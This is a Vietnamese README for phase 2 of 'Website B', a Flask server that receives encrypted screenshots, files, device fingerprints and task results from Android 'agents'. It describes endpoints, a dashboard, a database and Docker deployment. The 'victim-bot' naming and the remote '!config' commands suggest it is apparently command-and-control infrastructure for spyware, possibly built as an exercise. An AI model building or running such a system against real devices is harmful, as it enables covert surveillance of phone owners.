# Website B — Giai đoạn 2: telemetry API + dashboard (task.md mục 11/12/14/15/17/21/22)

## Endpoints

### Artifact endpoints (giữ nguyên từ giai đoạn 1)

| Endpoint | Method | Ghi chú |
|---|---|---|
| `/artifacts/screenshot` | POST | Upload PNG — body **AES-256-GCM** |
| `/artifacts/files` | POST | Upload artifact (txt/png/jpg/webp/gif) — AES body |
| `/artifacts/<artifact_id>` | GET | Tải artifact đã lưu |
| `/health` | GET | phase=2 |

### API telemetry (mới — giai đoạn 2)

| Endpoint | Method | Payload (encrypted JSON) |
|---|---|---|
| `/api/register` | POST | `agent_id, request_id, timestamp, app_version, device{model,manufacturer,android_version,sdk_version}` |
| `/api/heartbeat` | POST | `agent_id, request_id, timestamp, status, app_version` |
| `/api/results` | POST | `agent_id, task_id, request_id, timestamp, type, status, data` |
| `/api/logs` | POST | `agent_id, request_id, timestamp, entries[{task_id,timestamp,event,status,metadata}]` |

Tất cả:
- **Auth**: `Authorization: Bearer <AGENT_TOKEN>` — token trong `.env` ↔ `Config.kt apiToken()` agent (mục 14)
- **Body mã hoá**: `ENC1 + nonce(12B) + AES-256-GCM ciphertext` — cùng key `WEBSITE_AES_KEY` với artifact (mục 12.2)
- **Replay protection** (mục 12.1): `request_id` unique per agent (table `seen_requests`) + timestamp window **±300s** → `replay_detected` (409)

## Dashboard (mục 22)

`GET /` — render `templates/index.html` (Jinja **an toàn** — data là biến context, auto-refresh 10s):
- **Agents**: agent_id · ONLINE/OFFLINE (90s timeout) · last_seen · model/manufacturer · Android version · app version
- **Tasks**: task_id · agent · type · status (state machine màu) · created_at · completed_at
- **Results**: agent · task · status · result JSON (truncate 400)
- **Artifacts**: artifact_id · agent · task · type · filename · size · link download


## Database (`website_b.db`, mục 21)

| Bảng | Nội dung |
|---|---|
| `agents` | agent_id, fingerprint (model/manufacturer/android_version/sdk_version), app_version, created_at, last_seen, status, metadata |
| `tasks` | task_id, agent_id, type, status, created_at, received_at, completed_at, result (JSON), error |
| `logs` | agent_id, task_id, timestamp, event, status, metadata |
| `artifacts` | artifact_id, agent_id, task_id, type, filename, mime_type, size, storage_path, created_at |
| `seen_requests` | (agent_id, request_id) — replay protection |

## Chạy

```bash
cd website_b
pip install -r requirements.txt
python app.py   # http://0.0.0.0:8000
```

Device thật (USB): `adb reverse tcp:8000 tcp:8000` + agent dùng `http://127.0.0.1:8000` (default).
Emulator: `http://10.0.2.2:8000`.

## Khởi động lại sau khi đổi `.env`

Đổi `WEBSITE_AES_KEY`/`AGENT_TOKEN` → restart server → agent phía kia phải
`!config <agent> aes_key_hex <key>` (mục 12.2) / rebuild hoặc re-config.


## Docker deploy

```bash
cd website_b
docker compose up -d          # build + chạy (port 8000, đổi qua PORT=9000 nếu cần)
docker compose logs -f portal # xem log (victim-bot + access)
docker compose down           # dừng (data giữ nguyên bên ngoài container)
```

- Data **KHÔNG nằm trong image**: `.env`, `website_b.db`, `victim_bot.state.json`,
  `artifacts/` đều là bind-mount từ folder hiện tại → giữ nguyên khi build lại.
- **Chuyển server**: copy toàn bộ folder `website_b/` (gồm `.env`, `website_b.db`,
  `victim_bot.state.json`, `artifacts/`) sang máy mới → `docker compose up -d` là
  có ngay data + tài khoản + artifacts như cũ.
- Container chạy process duy nhất (victim-bot + Flask cùng process — như bản native).
